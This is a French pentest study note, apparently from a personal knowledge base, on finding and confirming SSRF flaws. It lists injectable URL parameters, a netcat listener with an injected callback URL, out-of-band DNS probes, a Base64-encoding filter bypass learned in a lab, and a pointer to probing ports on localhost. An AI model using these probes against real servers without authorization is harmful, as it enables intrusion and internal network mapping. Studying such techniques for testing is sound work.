---
titre: "SSRF — 1 - Repérage"
tags: [Failles, SSRF, reconnaissance]
---

# SSRF — 1. Repérage

> ⬅ [[SSRF - Index]]

## Où chercher : les paramètres qui déclenchent une requête serveur
```
?url=   ?uri=   ?next=   ?dest=   ?redirect=   ?return=   ?target=
?img=   ?image=   ?load=   ?fetch=   ?callback=   ?webhook=   ?proxy=
?feed=  ?host=   ?port=   ?to=   ?out=   ?view=   ?domain=   ?page=
```
Fonctionnalités typiques : import d'image/document par URL, webhooks,
vérificateurs de lien/santé, aperçu de site, PDF/screenshot générés côté serveur,
intégrations (SSO, oEmbed).

## Confirmer la SSRF

### In-band (la réponse revient)
Pointer vers un service **qu'on contrôle** et regarder la connexion arriver :
```bash
# listener
nc -nlvp 4444           # ou Burp Collaborator / webhook.site / interactsh
# injecter
?url=http://TON_IP:4444
```
→ une connexion depuis **l'IP de la cible** (souvent un User-Agent type `axios`,
`python-requests`, `Go-http-client`) = **SSRF confirmée**.

### Out-of-band (aveugle)
Si aucune réponse visible, utiliser un canal DNS/HTTP externe :
```
?url=http://<id>.oastify.com          # Burp Collaborator
?url=http://<id>.interact.sh          # interactsh
```
Un hit DNS **sans** hit HTTP = la requête part mais la réponse n'est pas rendue
(blind SSRF, exploitable via timing).

## Le piège : "input invalide" ≠ "protégé"
Un paramètre qui **refuse** ton URL peut n'être que **mal formaté**, pas filtré :
```bash
?id=http://TON_IP:4444          # {"error":"'id' parameter is invalid."}
echo -n "http://TON_IP:4444" | base64
?id=<BLOB_BASE64>               # accepté ! -> le nc reçoit la connexion
```
> 🔑 **Leçon** (vécue en lab) : toujours tester clair / Base64 / URL-encoding /
> double-encodage avant de conclure qu'un paramètre est protégé.
> `echo -n` (ou `tr -d '\n'`) pour éviter le `\n` qui corromprait l'URL.

## Signal pour le scan interne (voir exploitation)
Comparer **timing / message d'erreur** entre un port ouvert et fermé sur
`127.0.0.1` révèle l'état des ports → [[2 - Exploitation & techniques (SSRF)]].
